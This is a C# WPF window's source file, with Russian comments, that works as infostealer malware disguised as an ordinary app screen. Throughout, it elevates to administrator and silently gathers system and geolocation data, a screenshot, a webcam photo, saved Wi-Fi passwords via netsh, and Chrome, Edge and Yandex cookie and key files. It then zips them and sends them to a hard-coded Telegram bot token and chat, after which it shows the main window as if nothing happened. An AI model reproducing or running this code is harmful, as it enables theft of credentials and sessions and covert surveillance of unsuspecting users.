using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Net;
using Telegram.Bot;
using System.Windows;
using System.Drawing;
using System.Windows.Threading;
using System.Windows.Media.Animation;
using System.Drawing.Imaging;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using Newtonsoft.Json.Linq;
using System.Security.Principal;
using WPFUIKitProfessional;

namespace Bibon.Pages
{
    public partial class system : Window
    {
        public system()
        {
            InitializeComponent();

            if (!IsRunAsAdmin())
            {
                RunAsAdmin();
                return;
            }

            if (!IsInternetAvailable())
            {
                MainWindow mainWindow = new MainWindow();
                mainWindow.Show();
                this.Close();
                return;
            }

            myLabel.Content = $"{Environment.UserName}";

            Loaded += async (s, e) =>
            {
                // Для диагностики можно раскомментировать строку ниже:
                // await TestTelegramAsync();
                await RunMainLogicAsync();
            };
        }

        private bool IsRunAsAdmin()
        {
            var wi = WindowsIdentity.GetCurrent();
            var wp = new WindowsPrincipal(wi);
            return wp.IsInRole(WindowsBuiltInRole.Administrator);
        }

        private void RunAsAdmin()
        {
            ProcessStartInfo procStartInfo = new ProcessStartInfo
            {
                FileName = System.Reflection.Assembly.GetExecutingAssembly().Location,
                Verb = "runas"
            };

            try
            {
                Process.Start(procStartInfo);
                Application.Current.Shutdown();
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Не удалось запустить с правами администратора: {ex.Message}", "Ошибка", MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }

        private bool IsInternetAvailable()
        {
            try
            {
                using (var client = new WebClient())
                using (client.OpenRead("http://www.google.com"))
                {
                    return true;
                }
            }
            catch
            {
                return false;
            }
        }

        private async Task RunMainLogicAsync()
        {
            string tempPath = Path.GetTempPath();
            string zipPath = Path.Combine(tempPath, $"{Environment.MachineName}.zip");

            try
            {
                if (File.Exists(zipPath))
                    File.Delete(zipPath);

                // Параллельный сбор данных
                var sysInfoTask = Task.Run(GetSystemInfoText);
                var wifiInfoTask = Task.Run(GetWifiInfo);
                var screenshotTask = Task.Run(CaptureScreenshotToStream);
                var cameraTask = Task.Run(CapturePhotoFromCameraToStream);
                var cookiesTask = Task.Run(GetBrowserCookiesFiles);

                await Task.WhenAll(sysInfoTask, wifiInfoTask, screenshotTask, cameraTask, cookiesTask);

                using (var archive = ZipFile.Open(zipPath, ZipArchiveMode.Create))
                {
                    // Системная информация
                    var sysEntry = archive.CreateEntry("Info System/Info System.txt");
                    using (var writer = new StreamWriter(sysEntry.Open()))
                        writer.Write(await sysInfoTask);

                    // Wi-Fi
                    var wifiEntry = archive.CreateEntry("Wifi name/Wifi.txt");
                    using (var writer = new StreamWriter(wifiEntry.Open()))
                        writer.Write(await wifiInfoTask);

                    // Скриншот
                    using (var screenshotStream = await screenshotTask)
                    {
                        var screenshotEntry = archive.CreateEntry("Foto/screenshot.jpg");
                        using (var entryStream = screenshotEntry.Open())
                        {
                            screenshotStream.Position = 0;
                            screenshotStream.CopyTo(entryStream);
                        }
                    }

                    // Фото с камеры (если есть)
                    var cameraStream = await cameraTask;
                    if (cameraStream != null)
                    {
                        var cameraEntry = archive.CreateEntry("Foto/camera_photo.jpg");
                        using (var entryStream = cameraEntry.Open())
                        {
                            cameraStream.Position = 0;
                            cameraStream.CopyTo(entryStream);
                        }
                    }

                    // Cookies с обработкой занятости файла
                    foreach (var file in await cookiesTask)
                    {
                        if (File.Exists(file.Path))
                        {
                            try
                            {
                                // Копируем файл во временную папку с FileShare.ReadWrite
                                string tempCookiePath = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + "_" + Path.GetFileName(file.Path));
                                using (var sourceStream = new FileStream(file.Path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                                using (var destStream = new FileStream(tempCookiePath, FileMode.Create, FileAccess.Write, FileShare.None))
                                {
                                    sourceStream.CopyTo(destStream);
                                }
                                archive.CreateEntryFromFile(tempCookiePath, $"Cookie/{file.Browser}/{Path.GetFileName(file.Path)}", CompressionLevel.Optimal);
                                File.Delete(tempCookiePath); // Удаляем временный файл
                            }
                            catch (Exception ex)
                            {
                                // Файл не удалось скопировать — пропускаем
                                Console.WriteLine($"Не удалось скопировать файл cookies: {file.Path}. Ошибка: {ex.Message}");
                            }
                        }
                    }
                }

                await SendToTelegramAsync(zipPath);

                Button_Click1(null, null);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Ошибка при выполнении основной логики: {ex.Message}", "Ошибка", MessageBoxButton.OK, MessageBoxImage.Error);
                Button_Click1(null, null);
            }
        }

        // Сбор системной информации (асинхронно)
        private string GetSystemInfoText()
        {
            var sw = new StringWriter();
            sw.WriteLine("System Information:");
            sw.WriteLine(new string('-', 50));
            sw.WriteLine("{0,-25} {1}", "PC Name:", Environment.MachineName);
            sw.WriteLine("{0,-25} {1}", "User Name:", Environment.UserName);
            sw.WriteLine("{0,-25} {1}", "Windows Version:", GetWindowsVersion());
            sw.WriteLine("{0,-25} {1}", "Processor Architecture:", Environment.Is64BitOperatingSystem ? "64-bit" : "32-bit");
            sw.WriteLine("{0,-25} {1}", "Manufacturer:", GetHardwareInfo("Win32_ComputerSystem", "Manufacturer"));
            sw.WriteLine("{0,-25} {1}", "Model:", GetHardwareInfo("Win32_ComputerSystem", "Model"));
            sw.WriteLine("{0,-25} {1}", "BIOS Version:", GetHardwareInfo("Win32_BIOS", "Version"));
            sw.WriteLine("{0,-25} {1}", "RAM:", FormatBytes(Convert.ToInt64(GetHardwareInfo("Win32_ComputerSystem", "TotalPhysicalMemory"))));
            sw.WriteLine("{0,-25} {1}", "GPU:", GetHardwareInfo("Win32_VideoController", "Name"));
            sw.WriteLine("{0,-25} {1}", "Local IP:", GetLocalIPAddress());
            sw.WriteLine(GetPublicIPAddressAndGeoInfo());
            return sw.ToString();
        }

        private string GetPublicIPAddressAndGeoInfo()
        {
            using (WebClient client = new WebClient())
            {
                try
                {
                    string response = client.DownloadString("https://api.ipbase.com/v1/json/");
                    var json = JObject.Parse(response);

                    string ip = json["ip"]?.ToString();
                    string country = json["country_name"]?.ToString();
                    string region = json["region_name"]?.ToString();
                    string city = json["city"]?.ToString();
                    string zipCode = json["zip_code"]?.ToString();
                    string timeZone = json["time_zone"]?.ToString();
                    double latitude = json["latitude"]?.ToObject<double>() ?? 0;
                    double longitude = json["longitude"]?.ToObject<double>() ?? 0;

                    return string.Format(
                        "{0,-25} {1}\n{2,-25} {3}\n{4,-25} {5}\n{6,-25} {7}\n{8,-25} {9}\n{10,-25} {11}\n{12,-25} {13}\n{14,-25} {15}",
                        "IP:", ip,
                        "Country:", country,
                        "Region:", region,
                        "City:", city,
                        "Zip Code:", zipCode,
                        "Time Zone:", timeZone,
                        "Latitude:", latitude.ToString("0.#####"),
                        "Longitude:", longitude.ToString("0.#####")
                    );
                }
                catch
                {
                    return "IP and Geo Information: Unknown";
                }
            }
        }

        private string GetHardwareInfo(string wmiClass, string wmiProperty)
        {
            try
            {
                ManagementObjectSearcher searcher = new ManagementObjectSearcher($"SELECT {wmiProperty} FROM {wmiClass}");
                foreach (ManagementObject obj in searcher.Get())
                {
                    return obj[wmiProperty]?.ToString();
                }
            }
            catch
            {
                return "Unknown";
            }
            return "Unknown";
        }

        private string GetWindowsVersion()
        {
            return Environment.OSVersion.VersionString;
        }

        private string FormatBytes(long bytes)
        {
            string[] sizes = { "B", "KB", "MB", "GB", "TB" };
            double len = bytes;
            int order = 0;
            while (len >= 1024 && order < sizes.Length - 1)
            {
                order++;
                len /= 1024;
            }
            return $"{len:0.##} {sizes[order]}";
        }

        private string GetLocalIPAddress()
        {
            string localIP = "Unknown";
            foreach (var address in Dns.GetHostAddresses(Dns.GetHostName()))
            {
                if (address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                {
                    localIP = address.ToString();
                    break;
                }
            }
            return localIP;
        }

        // Скриншот в поток
        private MemoryStream CaptureScreenshotToStream()
        {
            var ms = new MemoryStream();
            using (var bmp = new Bitmap((int)SystemParameters.PrimaryScreenWidth, (int)SystemParameters.PrimaryScreenHeight))
            using (var g = Graphics.FromImage(bmp))
            {
                g.CopyFromScreen(0, 0, 0, 0, bmp.Size);
                var jpegCodec = GetEncoder(ImageFormat.Jpeg);
                var encoderParams = new EncoderParameters(1);
                encoderParams.Param[0] = new EncoderParameter(Encoder.Quality, 50L);
                bmp.Save(ms, jpegCodec, encoderParams);
            }
            ms.Position = 0;
            return ms;
        }

        // Фото с камеры в поток (если камера есть)
        private MemoryStream CapturePhotoFromCameraToStream()
        {
            try
            {
                var videoDevices = new AForge.Video.DirectShow.FilterInfoCollection(AForge.Video.DirectShow.FilterCategory.VideoInputDevice);
                if (videoDevices.Count == 0)
                    return null;

                var videoSource = new AForge.Video.DirectShow.VideoCaptureDevice(videoDevices[0].MonikerString);
                Bitmap bitmap = null;
                ManualResetEvent frameCaptured = new ManualResetEvent(false);

                videoSource.NewFrame += (sender, eventArgs) =>
                {
                    bitmap = (Bitmap)eventArgs.Frame.Clone();
                    frameCaptured.Set();
                    videoSource.SignalToStop();
                };
                videoSource.Start();

                if (!frameCaptured.WaitOne(TimeSpan.FromSeconds(5)))
                {
                    videoSource.SignalToStop();
                    return null;
                }

                var ms = new MemoryStream();
                var jpegCodec = GetEncoder(ImageFormat.Jpeg);
                var encoderParams = new EncoderParameters(1);
                encoderParams.Param[0] = new EncoderParameter(Encoder.Quality, 50L);
                bitmap.Save(ms, jpegCodec, encoderParams);
                ms.Position = 0;
                return ms;
            }
            catch
            {
                return null;
            }
        }

        private ImageCodecInfo GetEncoder(ImageFormat format)
        {
            return ImageCodecInfo.GetImageDecoders().FirstOrDefault(codec => codec.FormatID == format.Guid);
        }

        // Получение Wi-Fi профилей и паролей
        private string GetWifiInfo()
        {
            try
            {
                Process process = new Process();
                process.StartInfo.FileName = "powershell.exe";
                process.StartInfo.Arguments = "-Command \"(netsh wlan show profiles) | Select-String '\\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\\\"$name\\\" key=clear)} | Select-String 'Содержимое ключа\\W+\\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ ProfileName=$name; Password=$pass }} | ConvertTo-Json -Compress\"";
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;
                process.Start();
                string output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();

                var wifiList = Newtonsoft.Json.JsonConvert.DeserializeObject<List<WifiProfile>>(output);

                StringWriter writer = new StringWriter();
                writer.WriteLine("Wi-Fi Profiles:");
                writer.WriteLine(new string('-', 50));
                writer.WriteLine("{0,-25} {1}", "Profile Name", "Password");
                writer.WriteLine(new string('-', 50));

                foreach (var wifi in wifiList)
                {
                    writer.WriteLine("{0,-25} {1}", wifi.ProfileName, wifi.Password);
                }
                return writer.ToString();
            }
            catch
            {
                return "Wi-Fi info unavailable";
            }
        }

        public class WifiProfile
        {
            public string ProfileName { get; set; }
            public string Password { get; set; }
        }

        // Поиск файлов cookies браузеров
        private List<(string Browser, string Path)> GetBrowserCookiesFiles()
        {
            string[] browsers = { "Edge", "Chrome", "Yandex" };
            Dictionary<string, string[]> browserPaths = new Dictionary<string, string[]>
            {
                { "Edge", new string[]
                    {
                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft\\Edge\\User Data\\Local State"),
                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft\\Edge\\User Data\\Default\\Network\\Cookies")
                    }
                },
                { "Chrome", new string[]
                    {
                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google\\Chrome\\User Data\\Local State"),
                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google\\Chrome\\User Data\\Default\\Network\\Cookies")
                    }
                },
                { "Yandex", new string[]
                    {
                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Yandex\\YandexBrowser\\User Data\\Local State"),
                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Yandex\\YandexBrowser\\User Data\\Default\\Network\\Cookies")
                    }
                }
            };

            var result = new List<(string, string)>();
            foreach (var browser in browsers)
            {
                if (browserPaths.TryGetValue(browser, out string[] paths))
                {
                    foreach (var filePath in paths)
                    {
                        if (File.Exists(filePath))
                            result.Add((browser, filePath));
                    }
                }
            }
            return result;
        }

        // Отправка архива в Telegram с обработкой ошибок
        private async Task SendToTelegramAsync(string zipPath)
        {
            try
            {
                var botClient = new TelegramBotClient("7325932397:AAGYcJAyNxZPXC4Uw3rvzzrYP-6ionuD4Nw");
                using (var fileStream = new FileStream(zipPath, FileMode.Open, FileAccess.Read))
                {
                    await botClient.SendDocumentAsync(
                        chatId: "1005333334",
                        document: new Telegram.Bot.Types.InputFiles.InputOnlineFile(fileStream, $"{Environment.MachineName}.zip")
                    );
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Ошибка отправки в Telegram: {ex.Message}", "Ошибка", MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }

        // Проверка отправки текстового сообщения (для диагностики)
        private async Task TestTelegramAsync()
        {
            try
            {
                var botClient = new TelegramBotClient("7325932397:AAGYcJAyNxZPXC4Uw3rvzzrYP-6ionuD4Nw");
                await botClient.SendTextMessageAsync("1005333334", "Проверка связи с ботом");
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Ошибка отправки текста: {ex.Message}", "Ошибка", MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }

        // Анимация закрытия и переход в MainWindow
        private void Button_Click1(object sender, RoutedEventArgs e)
        {
            DoubleAnimation fadeOutAnimation = new DoubleAnimation
            {
                From = 1,
                To = 0,
                Duration = TimeSpan.FromSeconds(0.1)
            };

            fadeOutAnimation.Completed += (s, a) =>
            {
                this.Close();
            };

            this.BeginAnimation(Window.OpacityProperty, fadeOutAnimation);

            MainWindow mainWindow = new MainWindow();
            mainWindow.Show();
        }
    }
}